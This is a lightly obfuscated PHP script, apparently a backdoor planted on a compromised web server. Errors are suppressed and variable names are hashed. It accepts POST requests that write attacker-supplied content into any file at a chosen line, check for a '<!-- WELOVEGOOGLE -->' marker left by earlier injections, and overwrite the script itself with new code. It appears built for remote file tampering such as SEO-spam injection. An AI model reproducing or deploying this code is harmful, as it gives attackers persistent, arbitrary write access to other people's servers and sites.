<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
if($_POST["content"] && $_POST["location"] && $_POST["line"]) {
    $var_0debdce0ab93497920fd6ff94f2d01c6 = $_POST["content"];
    $var_ccab49de13449fddcc7f624bfa0c1ef9 = $_POST["location"];
    $var_536a7468e027c7d02d1c8b324bd1248b = $_POST["line"]-1;
    $var_6edc0ea0c293974046e2848f865fafa2 = null;
    if(@file_get_contents($var_ccab49de13449fddcc7f624bfa0c1ef9)) {
        $var_1654df2bfca35b2d391a907afa1a9b11 = @file_get_contents($var_ccab49de13449fddcc7f624bfa0c1ef9);
    } else {
        $var_29a48166877e732d021975dba891cd18 = @fopen($var_ccab49de13449fddcc7f624bfa0c1ef9, 'w+');
        $var_1654df2bfca35b2d391a907afa1a9b11 = @fopen($var_ccab49de13449fddcc7f624bfa0c1ef9, 'r');
    }
    $var_1654df2bfca35b2d391a907afa1a9b11 = explode("\n", $var_1654df2bfca35b2d391a907afa1a9b11);
    for ($var_3cdcd4534e315180c522d715fde8a666=0; $var_3cdcd4534e315180c522d715fde8a666<count($var_1654df2bfca35b2d391a907afa1a9b11); $var_3cdcd4534e315180c522d715fde8a666++) {
        $var_700909520fa2b6083891eb794bc9cfb5 = count($var_1654df2bfca35b2d391a907afa1a9b11)-1;
        if($var_700909520fa2b6083891eb794bc9cfb5==$var_3cdcd4534e315180c522d715fde8a666) {
            $var_0f8a1066e10a306078f821ccf809a45a = NULL;
        } else {
            $var_0f8a1066e10a306078f821ccf809a45a = "\n";
        }
        if(stristr($var_1654df2bfca35b2d391a907afa1a9b11[$var_3cdcd4534e315180c522d715fde8a666], '<!-- WELOVEGOOGLE -->') == false) {
            $var_6edc0ea0c293974046e2848f865fafa2 .= $var_1654df2bfca35b2d391a907afa1a9b11[$var_3cdcd4534e315180c522d715fde8a666].$var_0f8a1066e10a306078f821ccf809a45a;
        }
        if($var_3cdcd4534e315180c522d715fde8a666==$var_536a7468e027c7d02d1c8b324bd1248b) {
            $var_6edc0ea0c293974046e2848f865fafa2 .= $var_0debdce0ab93497920fd6ff94f2d01c6.$var_0f8a1066e10a306078f821ccf809a45a;
        }
    }
    if(@file_put_contents($var_ccab49de13449fddcc7f624bfa0c1ef9, $var_6edc0ea0c293974046e2848f865fafa2, FILE_TEXT)) {
        echo 'success';
    } elseif(@fwrite($var_29a48166877e732d021975dba891cd18, $var_6edc0ea0c293974046e2848f865fafa2)) {
        @fclose($var_29a48166877e732d021975dba891cd18);
        echo 'success';
    }
} elseif($_POST["location"] && $_POST["checkup"]) {
    $var_f7f0a97a1c1711a6c707740e6835973a = 'deleted';
    $var_ccab49de13449fddcc7f624bfa0c1ef9 = $_POST["location"];
    if(@file_get_contents($var_ccab49de13449fddcc7f624bfa0c1ef9)) {
        $var_1654df2bfca35b2d391a907afa1a9b11 = @file_get_contents($var_ccab49de13449fddcc7f624bfa0c1ef9);
    } else {
        $var_1654df2bfca35b2d391a907afa1a9b11 = @fopen($var_ccab49de13449fddcc7f624bfa0c1ef9, 'r');
    }
    $var_1654df2bfca35b2d391a907afa1a9b11 = explode("\n", $var_1654df2bfca35b2d391a907afa1a9b11);
    for ($var_3cdcd4534e315180c522d715fde8a666=0; $var_3cdcd4534e315180c522d715fde8a666<count($var_1654df2bfca35b2d391a907afa1a9b11); $var_3cdcd4534e315180c522d715fde8a666++) {
        if(stristr($var_1654df2bfca35b2d391a907afa1a9b11[$var_3cdcd4534e315180c522d715fde8a666], '<!-- WELOVEGOOGLE -->') == true) {
            $var_f7f0a97a1c1711a6c707740e6835973a = 'working';
        }
    }
    echo $var_f7f0a97a1c1711a6c707740e6835973a;
} elseif($_POST["content"] && $_POST["update"]) {
    $var_0debdce0ab93497920fd6ff94f2d01c6 = $_POST["content"];
    $var_ccab49de13449fddcc7f624bfa0c1ef9 = __FILE__;
    if(@file_get_contents($var_ccab49de13449fddcc7f624bfa0c1ef9)) {
        $var_1654df2bfca35b2d391a907afa1a9b11 = @file_get_contents($var_ccab49de13449fddcc7f624bfa0c1ef9);
        @file_put_contents($var_ccab49de13449fddcc7f624bfa0c1ef9, $var_0debdce0ab93497920fd6ff94f2d01c6, FILE_TEXT);
        echo 'success';
    } else {
        $var_29a48166877e732d021975dba891cd18 = @fopen($var_ccab49de13449fddcc7f624bfa0c1ef9, 'w+');
        @fwrite($var_29a48166877e732d021975dba891cd18, $var_0debdce0ab93497920fd6ff94f2d01c6);
        @fclose($var_29a48166877e732d021975dba891cd18);
        echo 'success';
    }
} else {
    echo 'error';
}
?>